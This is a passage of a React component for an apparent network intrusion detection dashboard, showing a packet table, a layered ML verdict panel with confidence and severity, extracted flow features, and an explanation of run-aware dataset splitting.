                          {pkt.flags.length > 0 ? (
                            <span className="text-rose-300">[{pkt.flags.join(',')}]</span>
                          ) : (
                            <span className="text-slate-600">-</span>
                          )}
                        </td>
                        <td className="p-2 text-slate-400 truncate max-w-[200px]" title={pkt.info}>
                          {pkt.info}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Scapy Generator Python Code Snippet */}
          <div className="bg-slate-950 p-3.5 rounded-xl border border-slate-800 space-y-2">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-slate-400 font-bold flex items-center gap-1.5">
                <FileCode className="w-3.5 h-3.5 text-amber-400" />
                <span>Underlying Scapy Ground-Truth Generator (`{scenario.filename}`)</span>
              </span>
              <span className="text-[10px] text-slate-500">Python 3.11</span>
            </div>
            <pre className="bg-slate-900 p-3 rounded-lg text-[11px] font-mono text-sky-300 overflow-x-auto border border-slate-800">
              {scenario.scapyGeneratorSnippet}
            </pre>
          </div>
        </div>

        {/* Right Column (5 Cols): Feature Dissector & Hybrid AI Verdict */}
        <div className="lg:col-span-5 space-y-4">
          
          {/* Subtabs for Right Panel */}
          <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-xl border border-slate-800 text-xs font-mono">
            <button
              onClick={() => setActiveTab('replay')}
              className={`flex-1 py-1.5 px-2 rounded-lg text-center transition-all cursor-pointer ${
                activeTab === 'replay' ? 'bg-sky-600 text-white font-bold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Hybrid AI Verdict
            </button>
            <button
              onClick={() => setActiveTab('features')}
              className={`flex-1 py-1.5 px-2 rounded-lg text-center transition-all cursor-pointer ${
                activeTab === 'features' ? 'bg-sky-600 text-white font-bold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Extracted Features
            </button>
            <button
              onClick={() => setActiveTab('run_aware')}
              className={`flex-1 py-1.5 px-2 rounded-lg text-center transition-all cursor-pointer ${
                activeTab === 'run_aware' ? 'bg-sky-600 text-white font-bold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Run-Aware Splits
            </button>
          </div>

          {/* TAB 1: Hybrid Detection Verdict & Confidence vs Severity */}
          {activeTab === 'replay' && (
            <div className="space-y-4">
              {/* Verdict Card */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <div className="flex items-start justify-between">
                  <div>
                    <span className="text-[10px] font-mono text-sky-400 uppercase font-bold">
                      HYBRID MULTI-SPECIALIST VERDICT
                    </span>
                    <h3 className="text-xl font-bold text-white mt-0.5">
                      {scenario.threatClass === 'benign' ? 'Normal Operational Traffic' : `${scenario.categoryTitle}`}
                    </h3>
                    <p className="text-xs text-slate-400 mt-1">
                      {scenario.description}
                    </p>
                  </div>
                  <span className={`px-3 py-1 rounded font-mono text-xs font-bold ${
                    scenario.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border border-rose-800' :
                    scenario.severity === 'HIGH' ? 'bg-amber-950 text-amber-300 border border-amber-800' :
                    scenario.severity === 'MEDIUM' ? 'bg-indigo-950 text-indigo-300 border border-indigo-800' :
                    scenario.severity === 'LOW' ? 'bg-sky-950 text-sky-300 border border-sky-800' :
                    'bg-emerald-950 text-emerald-300 border border-emerald-800'
                  }`}>
                    {scenario.severity} SEVERITY
                  </span>
                </div>

                {/* Separation of Confidence and Severity (Core requirement from vision) */}
                <div className="p-3.5 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
                  <div className="text-xs font-mono font-bold text-slate-300 uppercase flex items-center justify-between">
                    <span>Separation of Confidence vs Severity</span>
                    <span className="text-[10px] text-sky-400">Two Distinct Dimensions</span>
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div className="p-2.5 rounded-lg bg-slate-900 border border-slate-800">
                      <div className="text-[10px] text-slate-400 font-mono">Model Certainty</div>
                      <div className="text-xl font-bold font-mono text-sky-400 mt-0.5">
                        {modelConfidence.toFixed(1)}%
                      </div>
                      <div className="text-[10px] text-slate-400 mt-1">
                        Statistical probability of classification
                      </div>
                    </div>

                    <div className="p-2.5 rounded-lg bg-slate-900 border border-slate-800">
                      <div className="text-[10px] text-slate-400 font-mono">Operational Impact</div>
                      <div className={`text-xl font-bold font-mono mt-0.5 ${
                        scenario.severity === 'CRITICAL' ? 'text-rose-400' :
                        scenario.severity === 'HIGH' ? 'text-amber-400' :
                        scenario.severity === 'LOW' ? 'text-sky-400' : 'text-emerald-400'
                      }`}>
                        {scenario.severity}
                      </div>
                      <div className="text-[10px] text-slate-400 mt-1">
                        Potential security damage if realized
                      </div>
                    </div>
                  </div>

                  <div className="text-[11px] text-slate-400 leading-relaxed bg-slate-900/60 p-2.5 rounded border border-slate-800/80">
                    <strong className="text-slate-300">Design Rationale: </strong>
                    A horizontal port scan may achieve 99.1% Confidence but only LOW Severity, 
                    whereas a stealth exfiltration flow with 93.6% Confidence warrants CRITICAL operational response.
                  </div>
                </div>

                {/* 3-Tier Layered Detection Architecture */}
                <div className="space-y-2 text-xs">
                  <div className="text-[10px] font-mono text-slate-400 uppercase font-bold">
                    Layered Detection Engine Breakdown:
                  </div>

                  {/* Layer 1: Supervised Random Forest */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 flex items-start justify-between gap-3">
                    <div>
                      <div className="font-bold text-white flex items-center gap-1.5">
                        <Cpu className="w-3.5 h-3.5 text-sky-400" />
                        <span>Layer 1: Supervised Random Forest (Primary Multi-Class)</span>
                      </div>
                      <div className="text-[11px] text-slate-300 mt-1">
                        Specialist: {scenario.threatClass === 'dns_anomaly' ? 'DNS RF (Bambenek + Tranco)' : 'Flow RF (1.26M Flows)'}
                      </div>
                    </div>
                    <span className="font-mono text-sky-400 font-bold text-xs">{modelConfidence.toFixed(1)}%</span>
                  </div>

                  {/* Layer 2: Isolation Forest Anomaly Detection */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 flex items-start justify-between gap-3">
                    <div>
                      <div className="font-bold text-white flex items-center gap-1.5">
                        <Activity className="w-3.5 h-3.5 text-indigo-400" />
                        <span>Layer 2: Isolation Forest (Hypersphere Baseline Anomaly)</span>
                      </div>
                      <div className="text-[11px] text-slate-300 mt-1">
                        Detects subtle shifts from learned benign enterprise baseline
                      </div>
                    </div>
                    <span className="font-mono text-indigo-400 font-bold text-xs">{isolationForestScore.toFixed(2)} Score</span>
                  </div>

                  {/* Layer 3: Lightweight Behavioral Heuristics */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <div className="font-bold text-white flex items-center gap-1.5">
                      <Zap className="w-3.5 h-3.5 text-amber-400" />
                      <span>Layer 3: Deterministic Behavioral Signature Heuristics</span>
                    </div>
                    <div className="text-[11px] text-amber-300/90 font-mono mt-1">
                      {behavioralRule}
                    </div>
                  </div>
                </div>

                {/* Top Contributing Evidence Artifact */}
                <div className="p-3.5 bg-slate-950 rounded-lg border border-slate-800 space-y-2 text-xs">
                  <div className="font-bold text-slate-200 uppercase font-mono text-[11px] flex items-center gap-1.5">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Evidence-Backed Explanation Artifact:</span>
                  </div>
                  <ul className="space-y-1.5 text-[11px] text-slate-300">
                    <li className="flex items-start gap-2">
                      <span className="text-sky-400 font-bold">•</span>
                      <span><strong>Flow Rate:</strong> {pps.toFixed(1)} pkts/s, {bps.toFixed(0)} B/s (Threshold: &lt; 30 pkts/s)</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-sky-400 font-bold">•</span>
                      <span><strong>SYN Ratio:</strong> {(synRatio * 100).toFixed(1)}% (Incomplete Handshake Flag: {incompleteHandshake})</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-sky-400 font-bold">•</span>
                      <span><strong>Payload Entropy:</strong> {avgPayloadEntropy} bits (Normal Baseline: &lt; 3.0 bits)</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: Extracted Features (CICFlowMeter + Zeek) */}
          {activeTab === 'features' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
              <div>
                <span className="text-[10px] font-mono text-sky-400 uppercase font-bold">
                  PASSIVE FEATURE EXTRACTION (CICFLOWMETER + ZEEK)
                </span>
                <h3 className="text-base font-bold text-white mt-0.5">
                  Direction-Sensitive Flow Statistics (5-10s Window)
                </h3>
                <p className="text-[11px] text-slate-400 mt-1">
                  Reconstructed entirely from unidirectional forward stream without payload decryption.
                </p>
              </div>

              <div className="space-y-2 max-h-[380px] overflow-y-auto scrollbar-thin">
                <div className="grid grid-cols-2 gap-2">
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Flow Duration</div>
                    <div className="font-bold text-white font-mono mt-0.5">{duration.toFixed(3)} s</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Total Packets / Bytes</div>
                    <div className="font-bold text-white font-mono mt-0.5">{totalPackets} pkts / {totalBytes} B</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Packets Per Second</div>
                    <div className="font-bold text-sky-400 font-mono mt-0.5">{pps.toFixed(1)} /s</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Bytes Per Second</div>
                    <div className="font-bold text-sky-400 font-mono mt-0.5">{bps.toFixed(0)} B/s</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">TCP SYN Ratio</div>
                    <div className="font-bold text-amber-400 font-mono mt-0.5">{(synRatio * 100).toFixed(1)}%</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Incomplete Handshake</div>
                    <div className="font-bold text-rose-400 font-mono mt-0.5">FLAG = {incompleteHandshake}</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Zeek DNS Entropy</div>
                    <div className="font-bold text-indigo-400 font-mono mt-0.5">{scenario.threatClass === 'dns_anomaly' ? '3.58 bits' : '2.14 bits'}</div>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800">
                    <div className="text-[10px] text-slate-400 font-mono">Zeek JA3 Hash</div>
                    <div className="font-bold text-purple-400 font-mono mt-0.5 text-[10px] truncate">
                      {scenario.threatClass === 'encrypted_anomaly' ? 'a0e9f5d64349fb13...' : 'b32309a26951912...'}
                    </div>
                  </div>
                </div>

                <div className="p-3 bg-slate-950 rounded border border-slate-800 space-y-1">
                  <div className="font-bold text-slate-300 font-mono text-[11px]">Unidirectional Handshake Handling:</div>
                  <p className="text-slate-400 text-[11px] leading-relaxed">
                    Standard stateful firewalls break when return ACKs are missing. UniSentry treats `incomplete_handshake` 
                    and `out_in_byte_ratio` as primary mathematical discriminators rather than protocol failures.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* TAB 3: Run-Aware Splitting & Data Leakage Prevention */}
          {activeTab === 'run_aware' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
              <div>
                <span className="text-[10px] font-mono text-emerald-400 uppercase font-bold">
                  CONTROLLED SYNTHETIC DATASET GENERATION
                </span>
                <h3 className="text-base font-bold text-white mt-0.5">
                  Run-Aware Partitioning (Leakage-Proof Evaluation)
                </h3>
                <p className="text-[11px] text-slate-400 mt-1">
                  Prevents synthetic correlation leakage between training and evaluation sets.
                </p>
              </div>

              <div className="p-3.5 bg-slate-950 rounded-lg border border-slate-800 space-y-2.5">
                <div className="font-bold text-white text-xs">Why Naive Random Splitting Fails in Network ML:</div>
                <p className="text-[11px] text-slate-300 leading-relaxed">
                  In synthetic network experiments, packets generated within the same capture run share subtle inter-packet 
                  timing artifacts, IP pool seeds, and TCP sequence patterns. 
                  Standard random splits scatter flows from the same capture run across train and test sets, causing 
                  <strong> severe data leakage</strong> and artificially optimistic test accuracy.
                </p>
              </div>

              {/* Visual Split Architecture */}
              <div className="space-y-2">
                <div className="text-[10px] font-mono text-slate-400 uppercase font-bold">
                  Partition Allocation by Experimental Run:
                </div>
                
                <div className="p-2.5 rounded bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div>
                    <div className="font-bold text-white">Run #1 (Initial Capture Batches)</div>
                    <div className="text-[10px] text-slate-400">Scenarios: DDoS, Scan, Benign Baseline</div>
                  </div>
                  <span className="px-2 py-0.5 rounded bg-sky-950 text-sky-300 font-mono text-xs font-bold border border-sky-800">
                    TRAIN (70%)
                  </span>
                </div>

                <div className="p-2.5 rounded bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div>
                    <div className="font-bold text-white">Run #2 (Independent Replay Seeds)</div>
                    <div className="text-[10px] text-slate-400">Scenarios: C2 Jitter, DNS Tunnel, Tor JA3</div>
                  </div>
                  <span className="px-2 py-0.5 rounded bg-indigo-950 text-indigo-300 font-mono text-xs font-bold border border-indigo-800">
                    VALIDATE (15%)
                  </span>
                </div>

                <div className="p-2.5 rounded bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div>
                    <div className="font-bold text-white">Run #3 (Held-Out Golden Test Set)</div>
                    <div className="text-[10px] text-slate-400">Strictly unseen capture runs + 2% Jitter</div>
                  </div>
                  <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 font-mono text-xs font-bold border border-emerald-800">
                    EVALUATION (15%)
                  </span>
                </div>
              </div>

              <div className="pt-2">
                <button
                  onClick={() => alert('Dataset Manifest Generated:\n- 1.26M Cleaned Flows (Run-Aware Split)\n- Golden Set: 252,000 flows\n- Poisoning Tolerance: 0.0%\n- Format: CSV + OASIS STIX 2.1 JSON')}
                  className="w-full py-2.5 px-4 rounded-lg bg-gradient-to-r from-emerald-600 to-sky-600 hover:from-emerald-500 hover:to-sky-500 text-white font-mono font-bold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer shadow-md"
                >
                  <Download className="w-4 h-4" />
                  <span>EXPORT RUN-AWARE DATASET MANIFEST (CSV/PCAP)</span>
                </button>
              </div>
            </div>
          )}

        </div>
      </div>
    </div>
  );
};
